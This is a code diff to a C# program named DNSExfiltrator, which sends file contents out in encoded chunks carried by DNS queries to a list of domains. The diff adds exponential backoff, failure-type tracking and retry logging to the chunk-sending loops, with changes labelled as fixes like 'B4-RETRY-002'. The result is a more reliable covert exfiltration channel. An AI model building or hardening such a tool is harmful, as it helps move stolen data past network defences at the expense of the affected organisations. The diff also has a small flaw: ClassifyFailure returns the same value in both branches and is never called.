@@ -143,6 +143,71 @@ namespace DNSExfiltrator
             }
         }
 
+        public static class RetryHelper
+        {
+            public enum FailureType
+            {
+                None,
+                DnsError,
+                EmptyReply,
+                WrongAck,
+                Timeout
+            }
+            
+            public static int CalculateBackoffDelay(int baseDelay, int attempt, int maxDelay = 10000)
+            {
+                // Exponential backoff: baseDelay * 2^attempt
+                // Cap at maxDelay (10 seconds)
+                int delay = baseDelay * (int)Math.Pow(2, attempt);
+                return Math.Min(delay, maxDelay);
+            }
+            
+            public static FailureType ClassifyFailure(Exception ex, string reply, int expectedSeq)
+            {
+                if (ex != null)
+                {
+                    if (ex is System.Net.Sockets.SocketException || ex is System.Net.WebException)
+                        return FailureType.DnsError;
+                    return FailureType.DnsError;
+                }
+                if (string.IsNullOrEmpty(reply))
+                    return FailureType.EmptyReply;
+                
+                // Check if it's a wrong ACK
+                if (!string.IsNullOrEmpty(reply))
+                {
+                    try
+                    {
+                        string[] octets = reply.Split('.');
+                        if (octets.Length == 4)
+                        {
+                            int lastOctet = int.Parse(octets[3]);
+                            if (lastOctet != expectedSeq)
+                                return FailureType.WrongAck;
+                        }
+                    }
+                    catch { }
+                }
+                
+                return FailureType.Timeout;
+            }
+            
+            public static void LogRetry(int attempt, int maxAttempts, FailureType failureType, int delayMs)
+            {
+                string failureDesc = "";
+                switch (failureType)
+                {
+                    case FailureType.DnsError: failureDesc = "DNS error"; break;
+                    case FailureType.EmptyReply: failureDesc = "Empty reply"; break;
+                    case FailureType.WrongAck: failureDesc = "Wrong ACK"; break;
+                    case FailureType.Timeout: failureDesc = "Timeout"; break;
+                }
+                Console.Write("\r[!] " + failureDesc + ", retrying... (" + (attempt + 1) + "/" + maxAttempts + ")    ");
+                if (delayMs > 0)
+                    Thread.Sleep(delayMs);
+            }
+        }
+
         public static void Main(string[] args)
         {
             string filePath = String.Empty;
@@ -294,12 +359,15 @@ namespace DNSExfiltrator
                 string request = initPart + "." + domainList[i % domainList.Length];
 
                 bool success = false;
+                RetryHelper.FailureType lastFailure = RetryHelper.FailureType.None;
+                
                 for (int attempt = 0; attempt < maxRetries && !success; attempt++)
                 {
                     if (attempt > 0)
                     {
-                        PrintColor(String.Format("[*] Retry {0}/{1} for init part {2}", attempt, maxRetries, i + 1));
-                        Thread.Sleep(retryDelay);
+                        // FIX for B4-RETRY-002: Exponential backoff
+                        int backoffDelay = RetryHelper.CalculateBackoffDelay(retryDelay, attempt);
+                        RetryHelper.LogRetry(attempt, maxRetries, lastFailure, backoffDelay);
                     }
 
                     try
@@ -313,16 +381,24 @@ namespace DNSExfiltrator
                             PrintColor("[+] Init part " + (i + 1) + " OK (Reply: " + reply + ")");
                             success = true;
                         }
+                        else
+                        {
+                            // FIX for B4-RETRY-001: Track failure type
+                            lastFailure = RetryHelper.FailureType.EmptyReply;
+                        }
                     }
                     catch (Exception e)
                     {
-                        PrintColor("[!] Init part " + (i + 1) + " failed: " + e.Message);
+                        // FIX for B4-RETRY-001: Track failure type
+                        lastFailure = RetryHelper.FailureType.DnsError;
+                        if (attempt == 0)
+                            PrintColor("[!] Init part " + (i + 1) + " failed: " + e.Message);
                     }
                 }
 
                 if (!success)
                 {
-                    PrintColor("[!] Init failed after " + maxRetries + " attempts");
+                    PrintColor("[!] Init failed after " + maxRetries + " attempts (last failure: " + lastFailure + ")");
                     return;
                 }
 
@@ -414,11 +490,15 @@ namespace DNSExfiltrator
                 string request = encodedChunk + "." + domainList[(requestsSent + initChunks) % domainList.Length];
 
                 bool success = false;
+                RetryHelper.FailureType lastFailure = RetryHelper.FailureType.None;
+                
                 for (int attempt = 0; attempt < maxRetries && !success; attempt++)
                 {
                     if (attempt > 0)
                     {
-                        Thread.Sleep(retryDelay);
+                        // FIX for B4-RETRY-002: Exponential backoff
+                        int backoffDelay = RetryHelper.CalculateBackoffDelay(retryDelay, attempt);
+                        RetryHelper.LogRetry(attempt, maxRetries, lastFailure, backoffDelay);
                     }
 
                     try
@@ -427,7 +507,12 @@ namespace DNSExfiltrator
                             DNSResolver.GetARecord(request) :
                             DGResolver.GetARecord(dnsServer, request);
 
-                        if (VerifyAck(reply, requestsSent % 256))
+                        if (String.IsNullOrEmpty(reply))
+                        {
+                            // FIX for B4-RETRY-001: Track failure type
+                            lastFailure = RetryHelper.FailureType.EmptyReply;
+                        }
+                        else if (VerifyAck(reply, requestsSent % 256))
                         {
                             success = true;
                             requestsSent++;
@@ -436,25 +521,21 @@ namespace DNSExfiltrator
                         }
                         else
                         {
-                            if (attempt < maxRetries - 1)
-                            {
-                                Console.Write("\r[!] Wrong ACK, retrying... ({0}/{1})    ", attempt + 1, maxRetries);
-                            }
+                            // FIX for B4-RETRY-001: Track failure type
+                            lastFailure = RetryHelper.FailureType.WrongAck;
                         }
                     }
                     catch
                     {
-                        if (attempt < maxRetries - 1)
-                        {
-                            Console.Write("\r[!] Request failed, retrying... ({0}/{1})    ", attempt + 1, maxRetries);
-                        }
+                        // FIX for B4-RETRY-001: Track failure type
+                        lastFailure = RetryHelper.FailureType.DnsError;
                     }
                 }
 
                 if (!success)
                 {
                     Console.WriteLine();
-                    PrintColor(String.Format("[!] Failed to send request {0} after {1} attempts", requestsSent, maxRetries));
+                    PrintColor(String.Format("[!] Failed to send request {0} after {1} attempts (last failure: {2})", requestsSent, maxRetries, lastFailure));
                     return;
                 }
 
